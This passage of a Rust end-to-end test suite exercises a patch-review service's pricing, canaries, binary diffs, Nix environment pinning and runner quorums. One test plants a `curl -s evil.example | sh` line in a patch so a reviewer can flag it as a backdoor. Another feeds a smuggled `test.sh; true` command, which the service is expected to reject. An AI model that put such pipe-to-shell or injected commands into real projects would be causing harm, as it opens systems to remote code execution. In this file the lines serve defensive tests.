    ));
    assert!(!ledger_has(
        &api.me(&runners[0]),
        "run disagreed with the other runners"
    ));
    // The run is priced at the median CPU time (25 min: 3 units), so the
    // task is worth 1 review unit + 3 run units to each runner, and its
    // author owes for 4: ⌈3·4 / 0.9⌉ − 4 free = 10.
    let me = api.me(&runners[0]);
    assert!(me["duty"]["credited"].as_u64().unwrap() >= 4, "{me}");
    let me = api.me(&author);
    assert_eq!(me["duty"]["required"], 10, "{me}");

    // A newcomer's first patch here now owes work for its estimated run:
    // ⌈3·(1 + 3) / 0.9⌉ − 4 free = 10 units. With no review work left, it
    // is told to pay by contributing a canary.
    let newcomer = api.register(&format!("newcomer-{run}"));
    let tweak = repo.diff(&[("add.sh", Some(format!("{add}# faster\n")))]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&newcomer),
        Some(json!({ "project": upstream, "intent": format!("Tidy addition ({run})"), "base_commit": base, "diff": tweak })));
    assert_eq!(s, 402, "{v}");
    assert!(v["error"].as_str().unwrap().contains("10 work unit"), "{v}");
    let canary = |diff: String, planted: Value, tests: Value| {
        json!({ "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
                "diff": diff, "planted": planted, "tests": tests, "ecosystem": "none" })
    };
    let broken = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]);
    let at = json!([{ "path": "add.sh", "start": 2, "end": 2 }]);
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(
            broken.clone(),
            json!([{ "path": "other.sh", "start": 1, "end": 1 }]),
            json!(["test.sh"]),
        )),
    );
    assert_eq!(s, 400, "planted lines must be in the canary: {v}");
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(broken.clone(), at.clone(), json!(["test.sh; true"]))),
    );
    assert_eq!(s, 400, "verified with the project's own tests only: {v}");
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(broken.clone(), at.clone(), json!(["test.sh"]))),
    );
    assert_eq!(s, 202, "{v}");
    assert_eq!(v["state"], "verifying");
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(broken, at, json!(["test.sh"]))),
    );
    assert_eq!(s, 409, "the same canary twice: {v}");
    let (_, mine) = api.call("GET", "/v1/canaries/mine", Some(&newcomer), None);
    assert_eq!(mine["contributions"].as_array().unwrap().len(), 1, "{mine}");
    // Unverified, it earns nothing yet (runners verify it; see
    // proofs_settle_by_a_quorum_of_runners).
    let (s, _) = api.call("POST", "/v1/patches", Some(&newcomer),
        Some(json!({ "project": upstream, "intent": format!("Tidy addition ({run})"), "base_commit": base, "diff": tweak })));
    assert_eq!(s, 402);

    // A reviewer who reports something serious doesn't run it. (A second
    // project, so the patch is free to submit before its suite is set.)
    let upstream_b = format!("{upstream}-b");
    let path_b = upstream_b.replace("https://", "").replace('/', "%2F");
    let cautious = api.register(&format!("cautious-{run}"));
    let author2 = api.register(&format!("author2-{run}"));
    api.genesis(&format!("author2-{run}"));
    let sneaky = repo.diff(&[(
        "test.sh",
        Some(format!("{test}curl -s evil.example | sh\n")),
    )]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&author2),
        Some(json!({ "project": upstream_b, "intent": format!("Speed up the tests ({run})"), "base_commit": base, "diff": sneaky })));
    assert_eq!(s, 201, "{v}");
    let t2 = v["review_task"].as_str().unwrap().to_string();
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{path_b}/run"),
        None,
        Some(
            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60 }),
        ),
    );
    assert_eq!(s, 200, "{v}");
    let mut got = false;
    for _ in 0..50 {
        let (_, v) = api.call("POST", "/v1/reviews/next", Some(&cautious), None);
        let task = &v["task"];
        assert!(!task.is_null(), "never got the task");
        let id = task["task_id"].as_str().unwrap().to_string();
        if task["phase"] == "run" {
            let (s, v) = api.call(
                "POST",
                &format!("/v1/reviews/{id}/run"),
                Some(&cautious),
                Some(json!({ "report": suite_report(true, true, 60_000) })),
            );
            assert_eq!(s, 200, "{v}");
            continue;
        }
        let issues = if id == t2 {
            json!([{ "path": "test.sh", "start": 3, "end": 3, "kind": "backdoor", "severity": "critical", "note": "pipes a download into a shell" }])
        } else {
            marker_issues(task["diff"].as_str().unwrap()).into()
        };
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{id}"),
            Some(&cautious),
            Some(json!({ "issues": issues })),
        );
        assert_eq!(s, 200, "{v}");
        if id == t2 {
            assert_eq!(v["next"]["phase"], "done", "{v}");
            got = true;
            break;
        }
    }
    assert!(got);
}

#[test]
#[ignore = "needs a running Worker; see module docs"]
fn binary_patches_are_stored_whole_and_reviewed_whole() {
    let api = Api::new();
    let run = format!(
        "b{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/images-{run}");
    let repo = Repo::new(&[("render.py", &lines(20, "x"))]);
    let base = repo.base.clone();
    let author = api.register(&format!("painter-{run}"));
    // Standing, so the reviewer below is offered the task.
    api.genesis(&format!("painter-{run}"));
    let reviewer = api.register(&format!("critic-{run}"));

    // A text change with the reference image its test compares against.
    let image: Vec<u8> = (0..2000u32).map(|i| (i * 31 % 251) as u8).collect();
    let text = lines(20, "x").replace("x 5\n", "x five\n");
    let edits = [
        ("render.py", Some(text.as_bytes())),
        ("tests/ref.png", Some(&image[..])),
    ];
    let submit = |diff: String| {
        api.call(
            "POST",
            "/v1/patches",
            Some(&author),
            Some(json!({ "project": upstream, "intent": format!("Render fives as words ({run})"), "base_commit": base, "diff": diff })),
        )
    };

    // Without --binary the image's content is missing: refused, with the fix.
    let (s, v) = submit(
        "diff --git a/tests/ref.png b/tests/ref.png\nnew file mode 100644\nindex 0000000..1234567\nBinary files /dev/null and b/tests/ref.png differ\n"
            .into(),
    );
    assert_eq!(s, 400, "{v}");
    assert!(
        v["error"].as_str().unwrap().contains("git diff --binary"),
        "{v}"
    );

    let (s, v) = submit(repo.diff_bytes(&edits));
    assert_eq!(s, 201, "{v}");
    let patch = v["patch"]["id"].as_str().unwrap().to_string();
    let task_id = v["review_task"].as_str().unwrap().to_string();

    // What comes back applies outside a repository, as in the sandbox, and
    // produces the image byte for byte.
    let (s, v) = api.call("GET", &format!("/v1/patches/{patch}/diff"), None, None);
    assert_eq!(s, 200, "{v}");
    let stored = v.as_str().unwrap();
    assert_eq!(
        repo.applies_outside_git(stored, "tests/ref.png").as_deref(),
        Some(&image[..])
    );

    // The reviewer gets the image with the rest of the patch, and reports
    // it whole. The queue is global: other tests' tasks may come first.
    let mut v = Value::Null;
    for _ in 0..50 {
        let (s, next) = api.call("POST", "/v1/reviews/next", Some(&reviewer), None);
        assert_eq!(s, 200, "{next}");
        let task = &next["task"];
        assert!(!task.is_null(), "never got the task");
        let id = task["task_id"].as_str().unwrap().to_string();
        if id == task_id {
            v = next;
            break;
        }
        let (s, r) = if task["phase"] == "run" {
            api.call(
                "POST",
                &format!("/v1/reviews/{id}/run"),
                Some(&reviewer),
                Some(json!({ "report": suite_report(true, true, 60_000) })),
            )
        } else {
            let issues: Value = marker_issues(task["diff"].as_str().unwrap()).into();
            api.call(
                "POST",
                &format!("/v1/reviews/{id}"),
                Some(&reviewer),
                Some(json!({ "issues": issues })),
            )
        };
        assert_eq!(s, 200, "{r}");
    }
    assert_eq!(v["task"]["task_id"], task_id.as_str(), "{v}");
    assert!(
        v["task"]["diff"]
            .as_str()
            .unwrap()
            .contains("GIT binary patch"),
        "{v}"
    );
    let report = |start: u32, end: u32| {
        api.call(
            "POST",
            &format!("/v1/reviews/{task_id}"),
            Some(&reviewer),
            Some(json!({ "issues": [{ "path": "tests/ref.png", "start": start, "end": end, "kind": "other", "severity": "low", "note": "not a PNG" }] })),
        )
    };
    let (s, v) = report(5, 9);
    assert_eq!(s, 400, "{v}");
    assert!(v["error"].as_str().unwrap().contains("binary file"), "{v}");
    let (s, v) = report(1, 1);
    assert_eq!(s, 200, "{v}");
}

/// Project environments (ENVIRONMENTS.md): an admin sets one, every job
/// pins the version current when it was created, and the server fills the
/// spec from the pin wherever a spec leaves it, whatever a submitter sent.
/// Runs no sandbox and needs no Nix: the reports are synthetic.
#[test]
#[ignore = "needs a running Worker; see module docs"]
fn environments_are_pinned_and_filled_by_the_server() {
    let api = Api::new();
    let now_ms = || {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis() as i64
    };
    let run = format!("e{:x}", now_ms());
    let upstream = format!("https://github.com/e2e/envs-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");
    let add = "#!/bin/sh\necho $(($1 + $2))\n";
    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
    let repo = Repo::new(&[("add.sh", add), ("test.sh", test)]);
    let base = repo.base.clone();
    let (s, _) = api.call(
        "POST",
        "/v1/admin/pool",
        None,
        Some(json!({ "amount": 1000 })),
    );
    assert_eq!(s, 200);

    let author = api.register(&format!("author-{run}"));
    // Standing, so the patch's task is offered to the reviewers below.
    api.genesis(&format!("author-{run}"));
    let finder = api.register(&format!("finder-{run}"));
    let runners: Vec<String> = (0..3)
        .map(|i| {
            let name = format!("runner{i}-{run}");
            let token = api.register(&name);
            let (s, v) = api.call(
                "POST",
                "/v1/admin/genesis",
                None,
                Some(json!({ "operator": name, "amount": 100 })),
            );
            assert_eq!(s, 200, "{v}");
            token
        })
        .collect();
    let envs = || {
        api.call(
            "GET",
            &format!("/v1/projects/{project_path}/environments"),
            None,
            None,
        )
    };
    let set_env = |body: Value| {
        api.call(
            "PUT",
            &format!("/v1/admin/projects/{project_path}/environment"),
            None,
            Some(body),
        )
    };

    // A patch submitted while the project has no environment: stock.
    let stock_intent = format!("Make addition faster ({run})");
    let (s, v) = api.call("POST", "/v1/patches", Some(&runners[0]), Some(json!({ "project": upstream,
        "intent": stock_intent, "base_commit": base, "diff": repo.diff(&[("add.sh", Some(format!("{add}# fast\n")))]) })));
    assert_eq!(s, 201, "{v}");
    let (s, v) = envs();
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["current"]["id"], Value::Null, "{v}");
    assert_eq!(v["current"]["environment"], json!({ "stock": {} }), "{v}");
    assert!(v["versions"].as_array().unwrap().is_empty(), "{v}");

    // The admin sets a Nix package set. Records are validated, and stored
    // canonical: sorted and de-duplicated.
    let rev = "0123456789abcdef0123456789abcdef01234567";
    let (s, v) = set_env(json!({ "nix": { "nixpkgs": "nixos-25.05", "packages": ["hello"] } }));
    assert_eq!(s, 400, "a branch is not a pin: {v}");
    let (s, v) = set_env(json!({ "nix": { "nixpkgs": rev, "packages": ["--impure"] } }));
    assert_eq!(s, 400, "{v}");
    let res = ureq::put(&format!(
        "{}/v1/admin/projects/{project_path}/environment",
        api.base
    ))
    .send_json(json!(null));
    assert!(
        matches!(res, Err(ureq::Error::Status(403, _))),
        "only an admin sets an environment"
    );
    let (s, v) = set_env(
        json!({ "nix": { "nixpkgs": rev, "packages": ["pkg-config", "openssl.dev", "pkg-config"] } }),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["changed"], true, "{v}");
    let record = v["current"]["environment"].clone();
    let env_id = v["current"]["id"].as_str().unwrap().to_string();
    assert!(env_id.starts_with("env_"), "{v}");
    assert_eq!(
        record,
        json!({ "nix": { "nixpkgs": rev, "nixpkgs_hash": null, "packages": ["openssl.dev", "pkg-config"] } })
    );
    let (s, v) =
        set_env(json!({ "nix": { "nixpkgs": rev, "packages": ["pkg-config", "openssl.dev"] } }));
    assert_eq!(s, 200, "{v}");
    assert_eq!(
        v["changed"], false,
        "the same set in another order is the same record: {v}"
    );
    let (_, v) = envs();
    let versions = v["versions"].as_array().unwrap();
    assert_eq!(versions.len(), 1, "{v}");
    assert_eq!(versions[0]["version"], 1);
    assert_eq!(versions[0]["state"], "adopted");
    assert_eq!(versions[0]["id"], json!(env_id));
    assert_eq!(versions[0]["environment"], record);
    assert_eq!(v["current"]["id"], json!(env_id));

    // A patch submitted now pins it.
    let nix_intent = format!("Tidy up addition ({run})");
    let breaking = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 + $2 + 1))\n".into()))]);
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&author),
        Some(json!({ "project": upstream,
        "intent": nix_intent, "base_commit": base, "diff": breaking })),
    );
    assert_eq!(s, 201, "{v}");
    let patch = v["patch"]["id"].as_str().unwrap().to_string();

    // The run spec never carries an environment, whatever the admin sends.
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/run"),
        None,
        Some(
            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60,
                     "environment": { "nix": { "nixpkgs": rev, "packages": ["hello"] } } }),
        ),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["run_spec"]["environment"], json!({ "stock": {} }), "{v}");

    // A review task's run spec carries the environment its task pinned:
    // the patch from before the change runs stock, the one after in Nix.
    let mut seen = std::collections::HashMap::new();
    for _ in 0..50 {
        let (s, v) = api.call(
            "POST",
            "/v1/reviews/next?capabilities=nix",
            Some(&finder),
            None,
        );
        assert_eq!(s, 200, "{v}");
        let task = v["task"].clone();
        assert!(!task.is_null(), "ran out of tasks before reaching ours");
        let id = task["task_id"].as_str().unwrap().to_string();
        if task["phase"] == "review" {
            if task["intent"] == json!(stock_intent) || task["intent"] == json!(nix_intent) {
                seen.insert(
                    task["intent"].as_str().unwrap().to_string(),
                    task["run"]["environment"].clone(),
                );
            }
            let (s, v) = api.call(
                "POST",
                &format!("/v1/reviews/{id}"),
                Some(&finder),
                Some(json!({ "issues": marker_issues(task["diff"].as_str().unwrap()) })),
            );
            assert_eq!(s, 200, "{v}");
            if v["next"]["phase"] != "run" {
                if seen.len() == 2 {
                    break;
                }
                continue;
            }
        }
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{id}/run"),
            Some(&finder),
            Some(json!({ "report": suite_report(true, true, 60_000) })),
        );
        assert_eq!(s, 200, "{v}");
        if seen.len() == 2 {
            break;
        }
    }
    assert_eq!(
        seen.get(&stock_intent),
        Some(&json!({ "stock": {} })),
        "{seen:?}"
    );
    assert_eq!(seen.get(&nix_intent), Some(&record), "{seen:?}");

    // The run phase follows the review, so a Nix project's task is
    // assigned only to a reviewer that says it has Nix. Works through the
    // tasks `claim` offers, reviewing each as clean and reporting a
    // passing run, until none is left or the one with intent `stop_at` is
    // done; returns the intents seen and the last response.
    let work_through =
        |token: &str, claim: &dyn Fn() -> Value, stop_at: Option<&str>| -> (Vec<String>, Value) {
            let mut intents = Vec::new();
            for _ in 0..100 {
                let v = claim();
                let task = v["task"].clone();
                if task.is_null() {
                    return (intents, v);
                }
                let id = task["task_id"].as_str().unwrap().to_string();
                let intent = task["intent"].as_str().unwrap_or_default().to_string();
                if task["phase"] == "review" {
                    intents.push(intent.clone());
                    if stop_at == Some(intent.as_str()) {
                        // A held task comes back whatever the caller now says.
                        let (s, held) = api.call("POST", "/v1/reviews/next", Some(token), None);
                        assert_eq!(s, 200, "{held}");
                        assert_eq!(held["task"]["task_id"], json!(id), "{held}");
                    }
                    let (s, v) = api.call(
                        "POST",
                        &format!("/v1/reviews/{id}"),
                        Some(token),
                        Some(json!({ "issues": [] })),
                    );
                    assert_eq!(s, 200, "{v}");
                    if v["next"]["phase"] != "run" {
                        if stop_at == Some(intent.as_str()) {
                            return (intents, v);
                        }
                        continue;
                    }
                }
                let (s, v) = api.call(
                    "POST",
                    &format!("/v1/reviews/{id}/run"),
                    Some(token),
                    Some(json!({ "report": suite_report(true, true, 60_000) })),
                );
                assert_eq!(s, 200, "{v}");
                if stop_at == Some(intent.as_str()) {
                    return (intents, v);
                }
            }
            panic!("review tasks never ran out");
        };
    let mcp_next = |token: &str, args: Value| {
        let (s, v) = api.call(
            "POST",
            "/mcp",
            Some(token),
            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
                "params": { "name": "collective_review_next", "arguments": args } })),
        );
        assert_eq!(s, 200, "{v}");
        assert_ne!(v["result"]["isError"], true, "{v}");
        v["result"]["structuredContent"].clone()
    };
    let plain = api.register(&format!("plain-{run}"));
    let (intents, last) = work_through(
        &plain,
        &|| {
            let (s, v) = api.call(
                "POST",
                "/v1/reviews/next?capabilities=docker,gpu",
                Some(&plain),
                None,
            );
            assert_eq!(s, 200, "{v}");
            v
        },
        None,
    );
    assert!(
        intents.contains(&stock_intent),
        "stock tasks are still offered: {intents:?}"
    );
    assert!(
        !intents.contains(&nix_intent),
        "a reviewer without Nix is never assigned a Nix project's task: {intents:?}"
    );
    let message = last["message"].as_str().unwrap_or_default();
    assert!(
        message.contains("Nix") && message.contains("capabilities"),
        "the reviewer is told why and how to fix it: {last}"
    );
    let v = mcp_next(&plain, json!({}));
    assert!(v["task"].is_null(), "{v}");
    assert!(v["message"].as_str().unwrap().contains("Nix"), "{v}");
    let nixer = api.register(&format!("nixer-{run}"));
    let (intents, _) = work_through(
        &nixer,
        &|| mcp_next(&nixer, json!({ "capabilities": ["nix"] })),
        Some(&nix_intent),
    );
    assert!(intents.contains(&nix_intent), "{intents:?}");

    // A proof runs in the pinned environment; the one its submitter sent
    // is ignored.
    let challenge = api.report(&finder, &patch);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{challenge}/proofs"),
        Some(&finder),
        Some(
            json!({ "kind": "regression", "tests": ["test.sh"], "repeats": 2,
                     "environment": { "nix": { "nixpkgs": rev, "packages": ["hello"] } } }),
        ),
    );
    assert_eq!(s, 202, "{v}");
    let proof_id = v["id"].as_str().unwrap().to_string();
    assert_eq!(v["spec"]["environment"], record, "{v}");
    // Claims the open job, which must be this test's, checks the
    // environment it carries, and reports as given.
    // A runner that doesn't say it has Nix is offered no job in a Nix
    // environment, and is told why; unknown capabilities count for nothing.
    for path in ["/v1/proofs/next", "/v1/proofs/next?capabilities=docker"] {
        let (s, v) = api.call("POST", path, Some(&runners[0]), None);
        assert_eq!(s, 200, "{v}");
        assert!(v["job"].is_null(), "{v}");
        let message = v["message"].as_str().unwrap_or_default();
        assert!(
            message.contains("Nix") && message.contains("capabilities=nix"),
            "{v}"
        );
    }
    let run_job = |token: &str, base_passes: bool, patched_passes: bool| -> Value {
        let (s, v) = api.call(
            "POST",
            "/v1/proofs/next?capabilities=nix",
            Some(token),
            None,
        );
        assert_eq!(s, 200, "{v}");
        let job = v["job"].clone();
        assert!(!job.is_null(), "no job offered: {v}");
        assert_eq!(
            job["project"],
            json!(upstream.replace("https://", "")),
            "{job}"
        );
        assert_eq!(job["spec"]["environment"], record, "{job}");
        // The lease covers realising the environment (600 s) on top of
        // the proof's own budget (1440 s with the claim margin).
        let lease = job["expires_at"].as_i64().unwrap() - now_ms();
        assert!(lease > 1_900_000, "lease of {lease} ms: {job}");
        let id = job["run_id"].as_str().unwrap();
        let (_, held) = api.call("GET", &format!("/v1/proof-runs/{id}"), Some(token), None);
        assert_eq!(held["job"]["spec"]["environment"], record, "{held}");
        // A held run comes back whatever the caller now says.
        let (_, held) = api.call("POST", "/v1/proofs/next", Some(token), None);
        assert_eq!(held["job"]["run_id"], json!(id), "{held}");
        let (s, v) = api.call(
            "POST",
            &format!("/v1/proof-runs/{id}/report"),
            Some(token),
            Some(json!({ "report": proof_report(&job["spec"], base_passes, patched_passes) })),
        );
        assert_eq!(s, 200, "{v}");
        v
    };
    for r in &runners {
        run_job(r, true, false);
    }
    let (_, proof) = api.call("GET", &format!("/v1/proofs/{proof_id}"), None, None);
    assert_eq!(proof["verdict"], "proven", "{proof}");
    assert_eq!(proof["spec"]["environment"], record, "{proof}");

    // A contributed canary's verification runs in it too.
    let (s, v) = api.call("POST", "/v1/canaries", Some(&finder), Some(json!({
        "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
        "diff": repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]),
        "planted": [{ "path": "add.sh", "start": 2, "end": 2 }], "tests": ["test.sh"], "ecosystem": "none" })));
    assert_eq!(s, 202, "{v}");
    // Reported as not reproduced, so it is retired and leaves no task behind.
    for r in &runners {
        run_job(r, true, true);
    }
    let (_, mine) = api.call("GET", "/v1/canaries/mine", Some(&finder), None);
    assert_eq!(mine["contributions"][0]["state"], "failed", "{mine}");

    // `null` returns to stock, as a new version: history is never deleted.
    let (s, v) = set_env(json!(null));
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["changed"], true, "{v}");
    let (_, v) = envs();
    assert_eq!(v["current"]["id"], Value::Null, "{v}");
    assert_eq!(v["current"]["environment"], json!({ "stock": {} }), "{v}");
    let versions = v["versions"].as_array().unwrap();
    assert_eq!(versions.len(), 2, "{v}");
    assert_eq!(versions[0]["version"], 2);
    assert_eq!(versions[0]["environment"], json!({ "stock": {} }));
    assert_eq!(versions[1]["version"], 1);
    assert_eq!(versions[1]["environment"], record);
    let (s, v) = set_env(json!(null));
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["changed"], false, "{v}");
}

/// Environment proposals: only an operator with standing may propose one,
/// the proposal is a job runners claim (never the proposer), and a quorum
/// of trusted runners passing the project's suite in it adopts it, while a
/// quorum finding the suite fails refuses it and debits the proposer. Runs
/// no sandbox: the reports are synthetic.
#[test]
#[ignore = "needs a running Worker; see module docs"]
fn environments_are_proposed_with_standing_and_proven_by_runners() {
    let api = Api::new();
    let run = format!(
        "q{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/proposals-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");
    let add = "#!/bin/sh\necho $(($1 + $2))\n";
    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
    let repo = Repo::new(&[("add.sh", add), ("test.sh", test)]);
    let base = repo.base.clone();
    let founder_token = |name: &str| {
        let token = api.register(name);
        let (s, v) = api.call(
            "POST",
            "/v1/admin/genesis",
            None,
            Some(json!({ "operator": name, "amount": 100 })),
        );
        assert_eq!(s, 200, "{v}");
        token
    };
    let newcomer = api.register(&format!("newcomer-{run}"));
    let proposer = founder_token(&format!("proposer-{run}"));
    let runners: Vec<String> = (0..3)
        .map(|i| founder_token(&format!("runner{i}-{run}")))
        .collect();
    let rev = "0123456789abcdef0123456789abcdef01234567";
    let record = json!({ "nix": { "nixpkgs": rev, "packages": ["pkg-config", "hello"] } });
    let canonical = json!({ "nix": { "nixpkgs": rev, "nixpkgs_hash": null, "packages": ["hello", "pkg-config"] } });
    let propose = |token: &str, body: &Value| {
        api.call(
            "POST",
            &format!("/v1/projects/{project_path}/environments"),
            Some(token),
            Some(body.clone()),
        )
    };
    let envs = || {
        api.call(
            "GET",
            &format!("/v1/projects/{project_path}/environments"),
            None,
            None,
        )
        .1
    };

    // The project exists once a patch is submitted; its base is what an
    // environment is proven on.
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&runners[0]),
        Some(json!({ "project": upstream,
        "intent": format!("Make addition faster ({run})"), "base_commit": base,
        "diff": repo.diff(&[("add.sh", Some(format!("{add}# fast\n")))]) })),
    );
    assert_eq!(s, 201, "{v}");

    let tgz = std::process::Command::new("git")
        .args(["archive", "--format=tar.gz", "--prefix=src/", "HEAD"])
        .current_dir(&repo.dir)
        .output()
        .unwrap()
        .stdout;
    let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
    assert_eq!(s, 200, "{v}");

    // A newcomer has no standing to spend runners' compute.
    let (s, v) = propose(&newcomer, &record);
    assert_eq!(s, 403, "{v}");
    assert!(
        v["error"].as_str().unwrap_or_default().contains("standing"),
        "the refusal says what standing is: {v}"
    );
    // The proof is the project's suite, so a project without one can't
    // take proposals.
    let (s, v) = propose(&proposer, &record);
    assert_eq!(s, 400, "{v}");
    assert!(v.to_string().contains("run spec"), "{v}");
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/run"),
        None,
        Some(
            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 2, "timeout_secs": 90 }),
        ),
    );
    assert_eq!(s, 200, "{v}");
    // Records are validated.
    let (s, v) = propose(
        &proposer,
        &json!({ "nix": { "nixpkgs": "nixos-25.05", "packages": ["hello"] } }),
    );
    assert_eq!(s, 400, "a branch is not a pin: {v}");

    // An operator with standing proposes; the same set in another order is
    // the same proposal.
    let (s, v) = propose(&proposer, &record);
    assert_eq!(s, 202, "{v}");
    assert_eq!(v["state"], "proposed", "{v}");
    assert_eq!(v["version"], 1, "{v}");
    assert_eq!(v["environment"], canonical, "{v}");
    assert_eq!(v["base_commit"], json!(base), "{v}");
    let env_id = v["id"].as_str().unwrap().to_string();
    let (s, v) = propose(
        &proposer,
        &json!({ "nix": { "nixpkgs": rev, "packages": ["hello", "pkg-config", "hello"] } }),
    );
    assert_eq!(s, 409, "{v}");
    // The MCP tool shares the route's implementation.
    let (s, v) = api.call(
        "POST",
        "/mcp",
        Some(&proposer),
        Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call",
            "params": { "name": "collective_environment_propose", "arguments": { "project": upstream, "nix": canonical["nix"] } } })),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["result"]["isError"], true, "{v}");
    assert!(
        v["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("already"),
        "{v}"
    );
    let v = envs();
    assert_eq!(v["versions"][0]["state"], "proposed", "{v}");
    assert_eq!(
        v["current"]["id"],
        Value::Null,
        "not current until proven: {v}"
    );

    // A proposal's job always runs in Nix: a runner that doesn't say it
    // has Nix isn't offered it.
    let (s, v) = api.call("POST", "/v1/proofs/next", Some(&runners[0]), None);
    assert_eq!(s, 200, "{v}");
    assert!(v["job"].is_null(), "{v}");
    assert!(
        v["message"].as_str().unwrap_or_default().contains("Nix"),
        "{v}"
    );
    let next = |token: &str| {
        api.call(
            "POST",
            "/v1/proofs/next?capabilities=nix",
            Some(token),
            None,
        )
        .1["job"]
            .clone()
    };
    assert!(
        next(&proposer).is_null(),
        "the proposer is never offered its own proposal's proof"
    );
    // Each runner gets the suite, once, in the proposed environment, on
    // the base with nothing applied, and reports as given.
    let run_job = |token: &str, base_passes: bool, patched_passes: bool| -> Value {
        let job = next(token);
        assert!(!job.is_null(), "no job offered");
        assert_eq!(job["job_kind"], "environment", "{job}");
        assert_eq!(job["base_commit"], json!(base), "{job}");
        assert_eq!(job["diff"], "", "{job}");
        assert_eq!(job["spec"]["kind"], "suite", "{job}");
        assert_eq!(job["spec"]["repeats"], 1, "{job}");
        assert_eq!(job["spec"]["timeout_secs"], 90, "{job}");
        assert_eq!(job["spec"]["tests"], json!(["test.sh"]), "{job}");
        let id = job["run_id"].as_str().unwrap();
        let (s, _) = api.call("GET", job["source"].as_str().unwrap(), Some(token), None);
        assert_eq!(s, 200, "a runner can fetch the source of a job it holds");
        let (s, v) = api.call(
            "POST",
            &format!("/v1/proof-runs/{id}/report"),
            Some(token),
            Some(json!({ "report": suite_report(base_passes, patched_passes, 1000) })),
        );
        assert_eq!(s, 200, "{v}");
        job["spec"]["environment"].clone()
    };
    let env = run_job(&runners[0], true, true);
    assert_eq!(env, canonical);
    run_job(&runners[1], true, true);
    let v = envs();
    assert_eq!(
        v["versions"][0]["state"], "proposed",
        "two runners are no quorum: {v}"
    );
    run_job(&runners[2], true, true);
    let v = envs();
    assert_eq!(v["versions"][0]["state"], "adopted", "{v}");
    assert!(
        v["versions"][0]["reason"]
            .as_str()
            .unwrap()
            .starts_with("passed"),
        "{v}"
    );
    assert_eq!(v["current"]["id"], json!(env_id), "{v}");
    assert_eq!(v["current"]["environment"], canonical, "{v}");
    assert!(ledger_has(&api.me(&proposer), "environment_adopted"));
    assert!(ledger_has(&api.me(&runners[2]), "ran a proof"));
    assert!(
        next(&runners[0]).is_null(),
        "a decided proposal is no longer offered"
    );
    // Re-proposing the current environment is a duplicate too.
    let (s, v) = propose(&proposer, &record);
    assert_eq!(s, 409, "{v}");

    // A second proposal whose suite fails on base is refused, leaves the
    // first in place and costs its proposer.
    let (s, v) = propose(
        &proposer,
        &json!({ "nix": { "nixpkgs": rev, "packages": ["hello"] } }),
    );
    assert_eq!(s, 202, "{v}");
    assert_eq!(v["version"], 2, "{v}");
    for r in &runners {
        let env = run_job(r, false, false);
        assert_eq!(env["nix"]["packages"], json!(["hello"]));
    }
    let v = envs();
    assert_eq!(v["versions"][0]["version"], 2, "{v}");
    assert_eq!(v["versions"][0]["state"], "refused", "{v}");
    assert!(
        v["versions"][0]["reason"]
            .as_str()
            .unwrap()
            .starts_with("base_fails"),
        "{v}"
    );
    assert_eq!(v["versions"][1]["state"], "adopted", "{v}");
    assert_eq!(
        v["current"]["id"],
        json!(env_id),
        "the first stays current: {v}"
    );
    assert!(ledger_has(&api.me(&proposer), "environment_refused"));
    // The MCP tool lists the same history.
    let (s, v) = api.call(
        "POST",
        "/mcp",
        None,
        Some(json!({ "jsonrpc": "2.0", "id": 2, "method": "tools/call",
            "params": { "name": "collective_environments", "arguments": { "project": upstream } } })),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(
        v["result"]["structuredContent"]["current"]["id"],
        json!(env_id),
        "{v}"
    );
}

/// Newcomers (REVIEWS.md): a patch from an author without standing is
/// stored and searchable at once, but its review task waits until the
/// author earns standing or an operator with standing vouches for it by
/// lending rep, which comes back when the task resolves clean and is lost
/// when the patch is found bad.
#[test]
#[ignore = "needs a running Worker; see module docs"]
